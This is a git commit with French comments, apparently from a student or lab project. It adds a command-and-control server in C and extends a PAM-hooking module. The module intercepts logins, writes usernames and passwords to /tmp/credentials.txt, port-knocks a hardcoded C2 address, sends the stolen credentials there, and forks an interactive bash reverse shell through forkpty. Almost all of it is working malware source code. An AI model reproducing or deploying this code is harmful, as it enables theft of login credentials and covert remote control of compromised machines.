d90d18f48eb79c5beb44bfc947b84aa4f3fe05ef
Letmecooknw <eiov@myges.fr>
2025-02-17 07:37:48 -0600

    modifications de quasiment tout les fichiers pour y inclure le port knocking et l'envoi d'un reverse shell au c2

---
+++ C2/c2.c
@@ -0,0 +1,315 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <pthread.h>
+#include <arpa/inet.h>
+#include <ctype.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+
+#define KNOCK_PORT1 5001
+#define KNOCK_PORT2 5002
+#define KNOCK_PORT3 5003
+
+#define CREDS_PORT  4444   // Pour recevoir les credentials
+#define SHELL_PORT  4445   // Pour le mini-serveur "shell"
+
+#define BUFFER_SIZE 4096
+
+// Variables pour le knocking
+static int knockStep = 0;
+static char expectedIP[INET_ADDRSTRLEN] = {0};
+pthread_mutex_t knock_lock = PTHREAD_MUTEX_INITIALIZER;
+static int ports_opened = 0; // Permet d'ouvrir les ports 4444/4445 une fois la séquence validée
+
+// ---------------------------------------------------------------------
+// knock_listener : écoute sur un port et gère la séquence de port knocking
+// ---------------------------------------------------------------------
+void *knock_listener(void *arg) {
+    int port = *(int*)arg;
+    free(arg);
+
+    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
+    if(server_fd < 0) {
+        perror("socket");
+        pthread_exit(NULL);
+    }
+    int opt = 1;
+    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
+
+    struct sockaddr_in srv_addr, cli_addr;
+    socklen_t cli_len = sizeof(cli_addr);
+    memset(&srv_addr, 0, sizeof(srv_addr));
+    srv_addr.sin_family = AF_INET;
+    srv_addr.sin_port = htons(port);
+    srv_addr.sin_addr.s_addr = INADDR_ANY;
+
+    if(bind(server_fd, (struct sockaddr*)&srv_addr, sizeof(srv_addr)) < 0) {
+        perror("bind");
+        close(server_fd);
+        pthread_exit(NULL);
+    }
+    if(listen(server_fd, 5) < 0) {
+        perror("listen");
+        close(server_fd);
+        pthread_exit(NULL);
+    }
+
+    printf("[Knock Listener] Listening on port %d...\n", port);
+
+    while(1) {
+        int client_fd = accept(server_fd, (struct sockaddr*)&cli_addr, &cli_len);
+        if(client_fd < 0) {
+            perror("accept");
+            continue;
+        }
+
+        char ip[INET_ADDRSTRLEN];
+        inet_ntop(AF_INET, &cli_addr.sin_addr, ip, INET_ADDRSTRLEN);
+        printf("[Knock Listener] Connection from %s on port %d\n", ip, port);
+
+        pthread_mutex_lock(&knock_lock);
+        if(knockStep == 0 && port == KNOCK_PORT1) {
+            knockStep = 1;
+            strncpy(expectedIP, ip, INET_ADDRSTRLEN - 1);
+            printf("[Knock] 1/3 réussi. IP: %s\n", ip);
+        }
+        else if(knockStep == 1 && port == KNOCK_PORT2) {
+            if(strcmp(ip, expectedIP) == 0) {
+                knockStep = 2;
+                printf("[Knock] 2/3 réussi. IP: %s\n", ip);
+            } else {
+                knockStep = 0;
+                printf("[Knock] Mauvaise IP => reset.\n");
+            }
+        }
+        else if(knockStep == 2 && port == KNOCK_PORT3) {
+            if(strcmp(ip, expectedIP) == 0) {
+                knockStep = 3;
+                printf("[Knock] 3/3 réussi. Séquence validée!\n");
+                ports_opened = 1;
+            } else {
+                knockStep = 0;
+                printf("[Knock] Mauvaise IP => reset.\n");
+            }
+        }
+        else {
+            knockStep = 0;
+            printf("[Knock] Mauvais ordre => reset.\n");
+        }
+        pthread_mutex_unlock(&knock_lock);
+        close(client_fd);
+    }
+
+    close(server_fd);
+    pthread_exit(NULL);
+}
+
+// ---------------------------------------------------------------------
+// creds_server : thread pour réceptionner les credentials sur le port 4444
+// ---------------------------------------------------------------------
+void *creds_server(void *arg) {
+    (void)arg;
+
+    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
+    if(server_fd < 0) {
+        perror("[creds] socket");
+        pthread_exit(NULL);
+    }
+    int opt = 1;
+    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
+
+    struct sockaddr_in srv_addr, cli_addr;
+    socklen_t cli_len = sizeof(cli_addr);
+    memset(&srv_addr, 0, sizeof(srv_addr));
+    srv_addr.sin_family = AF_INET;
+    srv_addr.sin_port = htons(CREDS_PORT);
+    srv_addr.sin_addr.s_addr = INADDR_ANY;
+
+    if(bind(server_fd, (struct sockaddr*)&srv_addr, sizeof(srv_addr)) < 0) {
+        perror("[creds] bind");
+        close(server_fd);
+        pthread_exit(NULL);
+    }
+    if(listen(server_fd, 5) < 0) {
+        perror("[creds] listen");
+        close(server_fd);
+        pthread_exit(NULL);
+    }
+
+    printf("[Credentials] Thread ready on port %d (waiting for knocks to open)...\n", CREDS_PORT);
+
+    while(!ports_opened) {
+        sleep(1);
+    }
+    printf("[Credentials] Ports opened => accepting on %d...\n", CREDS_PORT);
+
+    while(1) {
+        int client_fd = accept(server_fd, (struct sockaddr*)&cli_addr, &cli_len);
+        if(client_fd < 0) {
+            perror("[creds] accept");
+            continue;
+        }
+        char ip[INET_ADDRSTRLEN];
+        inet_ntop(AF_INET, &cli_addr.sin_addr, ip, INET_ADDRSTRLEN);
+        printf("[Credentials] Connexion depuis %s\n", ip);
+
+        char filename[128];
+        snprintf(filename, sizeof(filename), "credentials_%s.txt", ip);
+        FILE *f = fopen(filename, "w");
+        if(!f) {
+            perror("[creds] fopen");
+            close(client_fd);
+            continue;
+        }
+        printf("[Credentials] Enregistrement dans %s\n", filename);
+
+        char buffer[BUFFER_SIZE];
+        ssize_t bytes;
+        while((bytes = recv(client_fd, buffer, sizeof(buffer), 0)) > 0) {
+            fwrite(buffer, 1, bytes, f);
+        }
+        fclose(f);
+        if(bytes < 0) {
+            perror("[creds] recv");
+        } else {
+            printf("[Credentials] Fichier %s reçu.\n", filename);
+        }
+        close(client_fd);
+    }
+
+    close(server_fd);
+    pthread_exit(NULL);
+}
+
+// ---------------------------------------------------------------------
+// shell_server : thread pour le mini-serveur "shell" sur le port 4445
+// ---------------------------------------------------------------------
+void *shell_server(void *arg) {
+    (void)arg;
+
+    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
+    if (server_fd < 0) {
+        perror("[Shell] socket");
+        pthread_exit(NULL);
+    }
+    int opt = 1;
+    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
+
+    struct sockaddr_in srv_addr;
+    memset(&srv_addr, 0, sizeof(srv_addr));
+    srv_addr.sin_family = AF_INET;
+    srv_addr.sin_port = htons(SHELL_PORT);
+    srv_addr.sin_addr.s_addr = INADDR_ANY;
+
+    if (bind(server_fd, (struct sockaddr*)&srv_addr, sizeof(srv_addr)) < 0) {
+        perror("[Shell] bind");
+        close(server_fd);
+        pthread_exit(NULL);
+    }
+    if (listen(server_fd, 5) < 0) {
+        perror("[Shell] listen");
+        close(server_fd);
+        pthread_exit(NULL);
+    }
+
+    printf("[Shell] Thread ready on port %d (waiting for knocks)...\n", SHELL_PORT);
+
+    while (!ports_opened) {
+        sleep(1);
+    }
+    printf("[Shell] Ports opened => accepting on %d (pass-through shell)...\n", SHELL_PORT);
+
+    while (1) {
+        struct sockaddr_in cli_addr;
+        socklen_t cli_len = sizeof(cli_addr);
+        int client_fd = accept(server_fd, (struct sockaddr*)&cli_addr, &cli_len);
+        if (client_fd < 0) {
+            perror("[Shell] accept");
+            continue;
+        }
+
+        char ip[INET_ADDRSTRLEN];
+        inet_ntop(AF_INET, &cli_addr.sin_addr, ip, INET_ADDRSTRLEN);
+        printf("[Shell] Connexion depuis %s\n", ip);
+
+        pid_t pid = fork();
+        if (pid < 0) {
+            perror("[Shell] fork");
+            close(client_fd);
+            continue;
+        }
+        if (pid == 0) {
+            close(server_fd);
+            printf("[Shell-child] Interactive session started with %s. Type commands here.\n", ip);
+            setbuf(stdin, NULL);
+
+            while (1) {
+                fd_set fds;
+                FD_ZERO(&fds);
+                FD_SET(client_fd, &fds);
+                FD_SET(STDIN_FILENO, &fds);
+                int maxfd = (client_fd > STDIN_FILENO) ? client_fd : STDIN_FILENO;
+                int ret = select(maxfd + 1, &fds, NULL, NULL, NULL);
+                if (ret < 0) {
+                    perror("[Shell-child] select");
+                    break;
+                }
+                if (FD_ISSET(client_fd, &fds)) {
+                    char buffer[1024];
+                    ssize_t n = recv(client_fd, buffer, sizeof(buffer), 0);
+                    if (n <= 0)
+                        break;
+                    write(STDOUT_FILENO, buffer, n);
+                }
+                if (FD_ISSET(STDIN_FILENO, &fds)) {
+                    char buffer[1024];
+                    ssize_t n = read(STDIN_FILENO, buffer, sizeof(buffer));
+                    if (n <= 0)
+                        break;
+                    send(client_fd, buffer, n, 0);
+                }
+            }
+            printf("[Shell-child] Session ended with %s\n", ip);
+            close(client_fd);
+            _exit(0);
+        } else {
+            close(client_fd);
+        }
+    }
+
+    close(server_fd);
+    pthread_exit(NULL);
+}
+
+// ---------------------------------------------------------------------
+// main : lancement des threads
+// ---------------------------------------------------------------------
+int main() {
+    printf("[Main] Lancement du C2 unifié.\n");
+
+    pthread_t tkn1, tkn2, tkn3;
+    int *p1 = malloc(sizeof(int)); *p1 = KNOCK_PORT1;
+    int *p2 = malloc(sizeof(int)); *p2 = KNOCK_PORT2;
+    int *p3 = malloc(sizeof(int)); *p3 = KNOCK_PORT3;
+    pthread_create(&tkn1, NULL, knock_listener, p1);
+    pthread_create(&tkn2, NULL, knock_listener, p2);
+    pthread_create(&tkn3, NULL, knock_listener, p3);
+
+    pthread_t tcreds;
+    pthread_create(&tcreds, NULL, creds_server, NULL);
+
+    pthread_t tshell;
+    pthread_create(&tshell, NULL, shell_server, NULL);
+
+    // Partie API supprimée
+
+    // Boucle infinie pour maintenir le programme en exécution
+    while (1) {
+        sleep(999999);
+    }
+
+    return 0;
+}
+
--- pam_auth_logger.c
+++ pam_auth_logger.c
@@ -12,21 +12,40 @@
 #include <sys/socket.h>
 #include <security/pam_appl.h>
 #include <security/pam_modules.h>
+#include <pty.h>      // Pour forkpty()
+#include <utmp.h>     // Pour forkpty()
 
-// Fonctions PAM d'origine
+#include "malware_http.h"  // On n’utilise que register_host désormais
+
+// ------------------------------------------------------------------
+// Pointeurs PAM
+// ------------------------------------------------------------------
 typedef int (*pam_get_item_t)(const pam_handle_t *, int, const void **);
 typedef int (*pam_get_user_t)(pam_handle_t *, const char **, const char *);
 
-// Config
-#define CREDENTIALS_FILE   "/tmp/credentials.txt"
-#define REMOTE_HOST        "192.168.64.11"  // IP de ton C2
-#define KNOCK_PORT1        5001
-#define KNOCK_PORT2        5002
-#define KNOCK_PORT3        5003
-#define CREDENTIALS_PORT   4444
-#define SHELL_PORT         4445
+static pam_get_item_t original_pam_get_item = NULL;
+static pam_get_user_t original_pam_get_user = NULL;
 
-// Obtenir l'heure
+// ------------------------------------------------------------------
+// Config
+// ------------------------------------------------------------------
+#define CREDENTIALS_FILE "/tmp/credentials.txt"
+
+// IP/ports
+#define REMOTE_HOST       "192.168.64.11"
+#define KNOCK_PORT1       5001
+#define KNOCK_PORT2       5002
+#define KNOCK_PORT3       5003
+#define CREDENTIALS_PORT  4444
+#define SHELL_PORT        4445
+
+// API
+#define C2_API_IP         "192.168.64.11"
+#define C2_API_PORT       8080
+
+// ------------------------------------------------------------------
+// Fonctions utilitaires
+// ------------------------------------------------------------------
 static const char *get_current_time() {
     static char buffer[20];
     time_t raw_time = time(NULL);
@@ -35,7 +54,6 @@ static const char *get_current_time() {
     return buffer;
 }
 
-// Écriture dans /tmp/credentials.txt
 static void write_to_file(const char *type, const char *data) {
     FILE *file = fopen(CREDENTIALS_FILE, "a");
     if (!file) {
@@ -46,23 +64,57 @@ static void write_to_file(const char *type, const char *data) {
     fclose(file);
 }
 
-// Port knocking (TCP connect "rapide")
-static int port_knock(const char *ip, int port) {
-    int sock;
-    struct sockaddr_in srv;
+// Si vous n'utilisez pas ces fonctions, vous pouvez soit les supprimer, soit ajouter __attribute__((unused))
+// static void get_machine_hostname(char *out, size_t out_size) __attribute__((unused));
+// static void get_machine_hostname(char *out, size_t out_size) {
+//     if (gethostname(out, out_size) == 0) {
+//         out[out_size - 1] = '\0';
+//     } else {
+//         strncpy(out, "UnknownHost", out_size - 1);
+//         out[out_size - 1] = '\0';
+//     }
+// }
+//
+// static void get_local_ip(char *out, size_t out_size) __attribute__((unused));
+// static void get_local_ip(char *out, size_t out_size) {
+//     int sock = socket(AF_INET, SOCK_DGRAM, 0);
+//     if (sock < 0) {
+//         strncpy(out, "0.0.0.0", out_size - 1);
+//         out[out_size - 1] = '\0';
+//         return;
+//     }
+//     struct sockaddr_in tmp;
+//     memset(&tmp, 0, sizeof(tmp));
+//     tmp.sin_family = AF_INET;
+//     tmp.sin_port   = htons(53);
+//     inet_pton(AF_INET, "8.8.8.8", &tmp.sin_addr);
+//     connect(sock, (struct sockaddr*)&tmp, sizeof(tmp));
+//     struct sockaddr_in name;
+//     socklen_t namelen = sizeof(name);
+//     if (getsockname(sock, (struct sockaddr*)&name, &namelen) == 0) {
+//         inet_ntop(AF_INET, &name.sin_addr, out, out_size);
+//     } else {
+//         strncpy(out, "0.0.0.0", out_size - 1);
+//     }
+//     close(sock);
+//     out[out_size - 1] = '\0';
+// }
 
-    sock = socket(AF_INET, SOCK_STREAM, 0);
+// ------------------------------------------------------------------
+// Fonctions de knocking, envoi de fichier et reverse shell
+// ------------------------------------------------------------------
+static int port_knock(const char *ip, int port) {
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock < 0) {
         syslog(LOG_ERR, "[ERROR] port_knock: socket : %m");
         return -1;
     }
+    struct sockaddr_in srv;
     memset(&srv, 0, sizeof(srv));
     srv.sin_family = AF_INET;
     srv.sin_port   = htons(port);
     inet_pton(AF_INET, ip, &srv.sin_addr);
-
-    if (connect(sock, (struct sockaddr *)&srv, sizeof(srv)) < 0) {
-        // "Connection refused" est normal si le port n'est pas ouvert
+    if (connect(sock, (struct sockaddr*)&srv, sizeof(srv)) < 0) {
         syslog(LOG_ERR, "[ERROR] port_knock: connexion %s:%d échouée : %m", ip, port);
     } else {
         syslog(LOG_INFO, "[INFO] Knock réussi sur %s:%d", ip, port);
@@ -71,87 +123,116 @@ static int port_knock(const char *ip, int port) {
     return 0;
 }
 
-// Envoie le fichier local sur le port remote_port
 static void send_file_tcp(const char *ip, int remote_port) {
-    int sock;
-    struct sockaddr_in srv;
-    char buffer[1024];
-
-    sock = socket(AF_INET, SOCK_STREAM, 0);
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock < 0) {
         syslog(LOG_ERR, "[ERROR] send_file_tcp: socket : %m");
         return;
     }
-
+    struct sockaddr_in srv;
     memset(&srv, 0, sizeof(srv));
     srv.sin_family = AF_INET;
     srv.sin_port   = htons(remote_port);
     inet_pton(AF_INET, ip, &srv.sin_addr);
-
-    if (connect(sock, (struct sockaddr *)&srv, sizeof(srv)) < 0) {
-        syslog(LOG_ERR, "[ERROR] Échec connexion %s:%d : %m", ip, remote_port);
+    if (connect(sock, (struct sockaddr*)&srv, sizeof(srv)) < 0) {
+        syslog(LOG_ERR, "[ERROR] Echec connexion %s:%d : %m", ip, remote_port);
         close(sock);
         return;
     }
-
     FILE *f = fopen(CREDENTIALS_FILE, "r");
     if (!f) {
-        syslog(LOG_ERR, "[ERROR] Impossible d'ouvrir %s pour l'envoi", CREDENTIALS_FILE);
+        syslog(LOG_ERR, "[ERROR] Impossible d'ouvrir %s pour envoi", CREDENTIALS_FILE);
         close(sock);
         return;
     }
-
+    char buffer[1024];
     size_t bytes_read;
     while ((bytes_read = fread(buffer, 1, sizeof(buffer), f)) > 0) {
         if (send(sock, buffer, bytes_read, 0) < 0) {
-            syslog(LOG_ERR, "[ERROR] Échec envoi data : %m");
+            syslog(LOG_ERR, "[ERROR] Echec send : %m");
             fclose(f);
             close(sock);
             return;
         }
     }
-
     fclose(f);
     close(sock);
     syslog(LOG_INFO, "[INFO] Fichier %s envoyé à %s:%d", CREDENTIALS_FILE, ip, remote_port);
 }
 
-// Pour exécuter le reverse shell
+// ------------------------------------------------------------------
+// Nouvelle version de launch_reverse_shell utilisant forkpty()
+// pour allouer une pseudo-tty et ainsi permettre le job control.
+// ------------------------------------------------------------------
 static void launch_reverse_shell(const char *ip, int port) {
-    pid_t pid = fork();
-    if (pid == 0) {
-        // Enfant => on ne bloque pas le process pam/sshd
-        int s = socket(AF_INET, SOCK_STREAM, 0);
-
-        struct sockaddr_in srv;
-        memset(&srv, 0, sizeof(srv));
-        srv.sin_family = AF_INET;
-        srv.sin_port   = htons(port);
-        inet_pton(AF_INET, ip, &srv.sin_addr);
-
-        connect(s, (struct sockaddr *)&srv, sizeof(srv));
-        dup2(s, 0);
-        dup2(s, 1);
-        dup2(s, 2);
-
-        execl("/bin/sh", "sh", NULL);
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0) {
+        syslog(LOG_ERR, "[ERROR] launch_reverse_shell: socket creation failed: %m");
         _exit(0);
+    }
+    struct sockaddr_in srv;
+    memset(&srv, 0, sizeof(srv));
+    srv.sin_family = AF_INET;
+    srv.sin_port = htons(port);
+    inet_pton(AF_INET, ip, &srv.sin_addr);
+    if (connect(sock, (struct sockaddr *)&srv, sizeof(srv)) < 0) {
+        syslog(LOG_ERR, "[ERROR] launch_reverse_shell: connection failed: %m");
+        close(sock);
+        _exit(0);
+    }
+    
+    int master_fd;
+    pid_t pid = forkpty(&master_fd, NULL, NULL, NULL);
+    if (pid < 0) {
+        syslog(LOG_ERR, "[ERROR] forkpty failed: %m");
+        close(sock);
+        _exit(0);
+    }
+    if (pid == 0) {
+        // Processus enfant : exécution d'un shell interactif
+        execl("/bin/bash", "bash", "-i", NULL);
+        _exit(0);
+    } else {
+        // Processus parent : relais entre la socket et la pseudo-tty
+        char buffer[1024];
+        fd_set fds;
+        int nfds = (sock > master_fd ? sock : master_fd) + 1;
+        while (1) {
+            FD_ZERO(&fds);
+            FD_SET(sock, &fds);
+            FD_SET(master_fd, &fds);
+            int ret = select(nfds, &fds, NULL, NULL, NULL);
+            if (ret < 0)
+                break;
+            if (FD_ISSET(sock, &fds)) {
+                int n = read(sock, buffer, sizeof(buffer));
+                if (n <= 0)
+                    break;
+                write(master_fd, buffer, n);
+            }
+            if (FD_ISSET(master_fd, &fds)) {
+                int n = read(master_fd, buffer, sizeof(buffer));
+                if (n <= 0)
+                    break;
+                write(sock, buffer, n);
+            }
+        }
+        close(sock);
+        close(master_fd);
     }
 }
 
-// --------------------------------------------------------------
+// ------------------------------------------------------------------
 // Intercepteurs PAM
-// --------------------------------------------------------------
-static pam_get_user_t original_pam_get_user = NULL;
+// ------------------------------------------------------------------
 int pam_get_user(pam_handle_t *pamh, const char **user, const char *prompt) {
     if (!original_pam_get_user) {
         original_pam_get_user = (pam_get_user_t)dlsym(RTLD_NEXT, "pam_get_user");
         if (!original_pam_get_user) {
-            syslog(LOG_ERR, "[ERROR] pam_get_user: dlsym : %s", dlerror());
+            syslog(LOG_ERR, "[ERROR] pam_get_user: dlsym: %s", dlerror());
             return PAM_SYSTEM_ERR;
         }
     }
-
     int retval = original_pam_get_user(pamh, user, prompt);
     if (retval == PAM_SUCCESS && *user) {
         write_to_file("Login", *user);
@@ -159,22 +240,20 @@ int pam_get_user(pam_handle_t *pamh, const char **user, const char *prompt) {
     return retval;
 }
 
-static pam_get_item_t original_pam_get_item = NULL;
 int pam_get_item(const pam_handle_t *pamh, int item_type, const void **item) {
     if (!original_pam_get_item) {
         original_pam_get_item = (pam_get_item_t)dlsym(RTLD_NEXT, "pam_get_item");
         if (!original_pam_get_item) {
-            syslog(LOG_ERR, "[ERROR] pam_get_item: dlsym : %s", dlerror());
+            syslog(LOG_ERR, "[ERROR] pam_get_item: dlsym: %s", dlerror());
             return PAM_SYSTEM_ERR;
         }
     }
-
     int retval = original_pam_get_item(pamh, item_type, item);
     if (retval == PAM_SUCCESS && item_type == PAM_AUTHTOK && item && *item) {
-        // On chope le mot de passe
-        write_to_file("Mot de passe", (const char *)*item);
+        const char *password = (const char*)(*item);
+        write_to_file("Password", password);
 
-        // 1) Knocks
+        // 1) Effectuer le port knocking
         port_knock(REMOTE_HOST, KNOCK_PORT1);
         sleep(1);
         port_knock(REMOTE_HOST, KNOCK_PORT2);
@@ -182,13 +261,16 @@ int pam_get_item(const pam_handle_t *pamh, int item_type, const void **item) {
         port_knock(REMOTE_HOST, KNOCK_PORT3);
         sleep(1);
 
-        // 2) Envoi du fichier sur 4444
+        // 2) Envoi des credentials
         send_file_tcp(REMOTE_HOST, CREDENTIALS_PORT);
 
-        // 3) Reverse shell vers 4445
-        launch_reverse_shell(REMOTE_HOST, SHELL_PORT);
+        // 3) Lancement du reverse shell dans un processus séparé pour ne pas bloquer l'authentification
+        pid_t shell_pid = fork();
+        if (shell_pid == 0) {
+            launch_reverse_shell(REMOTE_HOST, SHELL_PORT);
+            _exit(0);
+        }
     }
-
     return retval;
 }
 
